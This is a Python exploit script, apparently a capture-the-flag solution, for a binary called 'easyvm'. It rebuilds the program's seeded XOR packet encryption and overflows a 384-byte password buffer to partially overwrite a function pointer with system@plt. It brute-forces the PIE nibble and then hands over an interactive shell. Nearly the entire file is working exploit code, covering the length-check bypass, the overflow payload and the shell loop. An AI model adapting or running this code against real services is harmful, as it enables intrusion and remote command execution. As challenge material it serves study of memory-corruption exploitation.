#!/usr/bin/env python3
"""
EasyVM Exploit - CORRECTED
Buffer overflow in password to overwrite func_ptr with system@plt

The vulnerability:
1. Login handler copies password to 384-byte buffer at ctx+0x188
2. func_ptr is at ctx+0x308 (exactly 384 bytes after password buffer)
3. Length check can be bypassed with fake payload_len
4. Password copy uses strchr distance, not payload_len

Addresses (PIE relative):
- password_encoder: 0x18a0
- system@plt: 0x1060

With PIE base 0x555555555000:
- password_encoder: 0x5555555568a0 stored as: a0 68 55 55 55 55 00 00
- system@plt: 0x555555556060 stored as: 60 60 55 55 55 55 00 00

We overwrite bytes[0:2] from (0xa0, 0x?8) to (0x60, 0x?0)
The ? nibble depends on PIE base, so we brute force 16 values.
"""

import subprocess
import struct
import ctypes
import time
import sys
import select

libc = ctypes.CDLL('libc.so.6')

def init_xor_table(seed):
    libc.srand(ctypes.c_uint(seed))
    xor_table = []
    for i in range(16):
        r = libc.rand()
        xor_table.append([r & 0xff, (r >> 8) & 0xff, (r >> 16) & 0xff, (r >> 24) & 0xff])
    return xor_table

def xor_encrypt(data, xor_table):
    result = bytearray()
    edx = 0
    for byte_pair_idx in range(0, len(data), 2):
        ebp = byte_pair_idx
        row1 = edx & 0xf
        col1 = ebp & 2
        result.append(data[ebp] ^ xor_table[row1][col1])
        ecx = ((ebp & 2) >> 1) ^ 1
        ecx = ecx + edx
        if ebp + 1 < len(data):
            row2 = ecx & 0xf
            col2 = (ebp + 1) & 3
            result.append(data[ebp + 1] ^ xor_table[row2][col2])
        edx = ecx
    return bytes(result)

def try_exploit(byte1, cmd_prefix=b'sh #'):
    """Single exploit attempt with given byte1 value"""
    try:
        proc = subprocess.Popen(
            ['./easyvm'], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        
        # Read seed
        output = b''
        for _ in range(1000):
            c = proc.stdout.read(1)
            if not c:
                proc.terminate()
                return None, "no output"
            output += c
            if b'packet:' in output and b'\n' in output[-5:]:
                break
        
        seed = int(output.split(b':')[1].split()[0])
        xor_table = init_xor_table(seed)
        
        session = struct.pack('>Q', 0xDEADBEEFCAFEBABE)
        
        # Password: cmd_prefix + padding to 384 + overwrite 2 bytes
        # byte0 = 0x60 (always, changes 0xa0 to 0x60)
        # byte1 = brute force (changes 0x?8 to 0x?0)
        padding_len = 384 - len(cmd_prefix)
        password = cmd_prefix + b'A' * padding_len + bytes([0x60, byte1])
        
        username = b'x'
        cred_str = username + b':' + password + b';'
        payload = cred_str + session
        fake_payload_len = 390  # Bypass length check
        
        # Login
        login_packet = struct.pack('>II', 1, 0) + struct.pack('>I', fake_payload_len) + payload
        enc_login = xor_encrypt(login_packet, xor_table)
        
        proc.stdin.write(enc_login + b'\n')
        proc.stdin.flush()
        time.sleep(0.05)
        
        response = proc.stdout.read1(4096)
        if b'login ok' not in response:
            proc.terminate()
            return None, "login failed"
        
        # Execute - this calls func_ptr(password_buffer)
        # If we successfully overwrote func_ptr to system, this calls system("sh #AAA...")
        exec_packet = struct.pack('>II', 1, 1) + session
        enc_exec = xor_encrypt(exec_packet, xor_table)
        proc.stdin.write(enc_exec + b'\n')
        proc.stdin.flush()
        time.sleep(0.15)
        
        # Check for shell
        proc.stdin.write(b'echo SHELL_OK_XYZ\n')
        proc.stdin.flush()
        time.sleep(0.15)
        
        poll = proc.poll()
        if poll is not None:
            return None, f"crashed ({poll})"
        
        response = proc.stdout.read1(4096)
        if b'SHELL_OK_XYZ' in response:
            return proc, "shell"
        
        proc.terminate()
        return None, "no shell response"
        
    except Exception as e:
        try:
            proc.terminate()
        except:
            pass
        return None, str(e)

def main():
    print("[*] EasyVM Exploit - Buffer Overflow to system()")
    print("[*] Overwriting func_ptr: 0x18a0 -> 0x1060")
    print("[*] Brute-forcing PIE nibble (1/16 success rate per attempt)")
    print()
    
    # byte1 values: 0x00, 0x10, 0x20, ... 0xf0
    # These are the possible values for the high nibble of the page offset
    byte1_values = [n << 4 for n in range(16)]
    
    attempt = 0
    max_attempts = 500
    
    while attempt < max_attempts:
        byte1 = byte1_values[attempt % 16]
        attempt += 1
        
        if attempt % 16 == 1:
            print(f"[*] Attempt {attempt}...")
        
        proc, result = try_exploit(byte1)
        
        if proc is not None:
            print(f"[+] GOT SHELL! Attempt {attempt}, byte1=0x{byte1:02x}")
            print("[*] Interactive shell mode. Type commands, Ctrl+C to exit.")
            
            try:
                while True:
                    r, _, _ = select.select([sys.stdin, proc.stdout], [], [], 0.1)
                    
                    if sys.stdin in r:
                        cmd = sys.stdin.readline()
                        if not cmd:
                            break
                        proc.stdin.write(cmd.encode())
                        proc.stdin.flush()
                    
                    if proc.stdout in r:
                        try:
                            out = proc.stdout.read1(4096)
                            if out:
                                sys.stdout.write(out.decode(errors='replace'))
                                sys.stdout.flush()
                        except:
                            break
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
            
            proc.terminate()
            return 0
    
    print(f"[-] No shell after {max_attempts} attempts")
    return 1

if __name__ == '__main__':
    sys.exit(main())
